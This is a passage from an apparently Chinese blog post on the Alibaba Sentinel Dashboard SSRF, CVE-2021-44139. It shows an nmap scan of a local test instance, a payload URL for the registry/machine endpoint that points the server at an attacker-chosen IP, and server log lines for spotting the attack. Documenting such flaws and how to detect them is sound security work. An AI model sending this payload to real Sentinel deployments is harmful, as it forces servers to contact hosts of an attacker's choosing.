class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h2><h3 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h3><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from 